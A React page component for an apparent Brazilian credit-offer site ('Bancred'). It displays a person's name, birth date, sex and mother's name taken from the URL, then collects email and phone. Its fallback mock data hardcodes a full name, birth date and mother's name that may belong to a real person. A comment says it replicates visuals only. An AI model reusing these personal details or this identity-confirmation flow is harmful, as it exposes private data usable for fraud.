import { useState, FormEvent } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { User, Calendar, SquareUserRound, Users, Mail, Phone } from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import PartnerBanksFooter from "@/components/PartnerBanksFooter";
import ConsultorCard from "@/components/ConsultorCard";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

// Mock person data (replicating visual only — no backend)
const PERSON_DEFAULT = {
  fullName: "FRANCISCO VALDEMIR VIEIRA FILHO",
  birthDate: "05/02/2004",
  sex: "M",
  motherName: "EDILMA CAVALCANTE DA SILVA",
};

const formatPhone = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length <= 2) return digits.length ? `(${digits}` : "";
  if (digits.length <= 6) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  if (digits.length <= 10)
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}`;
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
};

type InfoCardProps = { icon: any; label: string; value: string };

const InfoCard = ({ icon: Icon, label, value }: InfoCardProps) => (
  <div
    style={{
      background: "#FFFFFF",
      border: "1px solid #E5E7EB",
      borderRadius: 10,
      padding: "10px 14px",
      display: "flex",
      alignItems: "center",
      gap: 12,
      fontFamily: fontStack,
    }}
  >
    <span
      style={{
        width: 32,
        height: 32,
        borderRadius: 8,
        background: "#EFF6FF",
        color: "#1C68E3",
        display: "inline-flex",
        alignItems: "center",
        justifyContent: "center",
        flexShrink: 0,
      }}
    >
      <Icon width={16} height={16} />
    </span>
    <div style={{ minWidth: 0 }}>
      <div
        style={{
          fontSize: 11,
          color: "#6B7280",
          textTransform: "uppercase",
          letterSpacing: 0.4,
        }}
      >
        {label}
      </div>
      <div
        style={{
          fontSize: 14,
          color: "#111827",
          fontWeight: 600,
          marginTop: 2,
          overflow: "hidden",
          textOverflow: "ellipsis",
          whiteSpace: "nowrap",
        }}
      >
        {value}
      </div>
    </div>
  </div>
);

const inputStyle: React.CSSProperties = {
  width: "100%",
  padding: "14px 16px",
  border: "1.5px solid #E5E7EB",
  borderRadius: 12,
  fontSize: 16,
  outline: "none",
  boxSizing: "border-box",
  background: "#FFFFFF",
  color: "#111827",
  fontFamily: fontStack,
  minHeight: 50,
  transition: "border-color 0.15s ease, box-shadow 0.15s ease",
  WebkitAppearance: "none",
};

const Pessoa = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");

  const nomeParam = (searchParams.get("nome") || "").trim();
  const nascimentoParam = (searchParams.get("nascimento") || "").trim();
  const sexoParam = (searchParams.get("sexo") || "").trim();
  const maeParam = (searchParams.get("mae") || "").trim();

  // Normaliza data para DD/MM/AAAA quando vier como AAAA-MM-DD
  const formatBirth = (raw: string) => {
    if (!raw) return PERSON_DEFAULT.birthDate;
    const iso = raw.match(/^(\d{4})-(\d{2})-(\d{2})/);
    if (iso) return `${iso[3]}/${iso[2]}/${iso[1]}`;
    return raw;
  };

  // Normaliza sexo para apenas a primeira letra (M / F)
  const formatSex = (raw: string) => {
    if (!raw) return PERSON_DEFAULT.sex;
    return raw.trim().charAt(0).toUpperCase();
  };

  const PERSON = {
    firstName: (nomeParam.split(" ")[0] || "FRANCISCO").toUpperCase(),
    fullName: (nomeParam || PERSON_DEFAULT.fullName).toUpperCase(),
    birthDate: formatBirth(nascimentoParam),
    sex: formatSex(sexoParam),
    motherName: (maeParam || PERSON_DEFAULT.motherName).toUpperCase(),
  };

  const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const isPhoneValid = phone.replace(/\D/g, "").length >= 10;
  const canSubmit = isEmailValid && isPhoneValid;

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!canSubmit) return;
    const cpf = searchParams.get("cpf") ?? "";
    const qs = new URLSearchParams();
    if (cpf) qs.set("cpf", cpf);
    if (nomeParam) qs.set("nome", nomeParam);
    if (email) qs.set("email", email);
    if (phone) qs.set("telefone", phone);
    try {
      sessionStorage.setItem(
        "bancred_customer",
        JSON.stringify({
          name: nomeParam || "",
          email,
          phone,
          document: cpf,
        }),
      );
    } catch { /* noop */ }
    navigate(`/oferta?${qs.toString()}`);
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
          paddingTop: "calc(14px + env(safe-area-inset-top))",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main style={{ padding: "20px 16px 110px", maxWidth: 480, margin: "0 auto" }}>
        <div style={{ marginBottom: 16 }}>
          <ConsultorCard />
        </div>
        <h1
          style={{
            fontSize: 22,
            fontWeight: 700,
            color: "#111827",
            marginBottom: 6,
          }}
        >
          Olá, {PERSON.firstName}!
        </h1>
        <p style={{ fontSize: 14, color: "#6B7280", marginBottom: 18 }}>
          Confirme se os dados abaixo estão corretos e adicione seu contato.
        </p>

        <div style={{ display: "grid", gap: 10, marginBottom: 16 }}>
          <InfoCard icon={User} label="Nome completo" value={PERSON.fullName} />
          <InfoCard icon={Calendar} label="Data de nascimento" value={PERSON.birthDate} />
          <InfoCard icon={SquareUserRound} label="Sexo" value={PERSON.sex} />
          <InfoCard icon={Users} label="Nome da mãe" value={PERSON.motherName} />
        </div>

        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 18,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
          }}
        >
          <h2
            style={{
              fontSize: 15,
              fontWeight: 700,
              color: "#111827",
              marginBottom: 14,
            }}
          >
            Dados de contato
          </h2>

          <form onSubmit={handleSubmit}>
            <label
              style={{
                display: "block",
                fontSize: 13,
                fontWeight: 600,
                color: "#111827",
                marginBottom: 6,
              }}
            >
              <Mail
                width={14}
                height={14}
                style={{ display: "inline", marginRight: 6, verticalAlign: -2 }}
              />
              E-mail
            </label>
            <input
              type="email"
              placeholder="seu@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              maxLength={255}
              style={{ ...inputStyle, marginBottom: 14 }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#1C68E3";
                e.currentTarget.style.boxShadow = "0 0 0 3px rgba(28,104,227,0.15)";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#E5E7EB";
                e.currentTarget.style.boxShadow = "none";
              }}
            />

            <label
              style={{
                display: "block",
                fontSize: 13,
                fontWeight: 600,
                color: "#111827",
                marginBottom: 6,
              }}
            >
              <Phone
                width={14}
                height={14}
                style={{ display: "inline", marginRight: 6, verticalAlign: -2 }}
              />
              Telefone
            </label>
            <input
              type="tel"
              inputMode="numeric"
              placeholder="(11) 99999-9999"
              value={phone}
              onChange={(e) => setPhone(formatPhone(e.target.value))}
              maxLength={15}
              style={{ ...inputStyle, marginBottom: 18 }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#1C68E3";
                e.currentTarget.style.boxShadow = "0 0 0 3px rgba(28,104,227,0.15)";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#E5E7EB";
                e.currentTarget.style.boxShadow = "none";
              }}
            />

            <button
              type="submit"
              disabled={!canSubmit}
              style={{
                width: "100%",
                padding: "15px 20px",
                background: "#1C68E3",
                color: "#fff",
                border: "none",
                borderRadius: 14,
                fontSize: 16,
                fontWeight: 700,
                letterSpacing: -0.2,
                cursor: canSubmit ? "pointer" : "not-allowed",
                boxShadow: "0 8px 24px rgba(28,104,227,0.28)",
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 8,
                fontFamily: fontStack,
                minHeight: 52,
                opacity: canSubmit ? 1 : 0.6,
                transition: "transform 0.08s ease, background 0.15s ease, opacity 0.15s ease",
              }}
            >
              Continuar
            </button>
          </form>
          <p
            style={{
              textAlign: "center",
              fontSize: 12,
              color: "#9CA3AF",
              marginTop: 16,
              fontFamily: fontStack,
            }}
          >
            Seus dados estão protegidos e serão usados apenas para sua proposta de crédito.
          </p>
        </div>
      </main>
      <PartnerBanksFooter />
    </div>
  );
};

export default Pessoa;
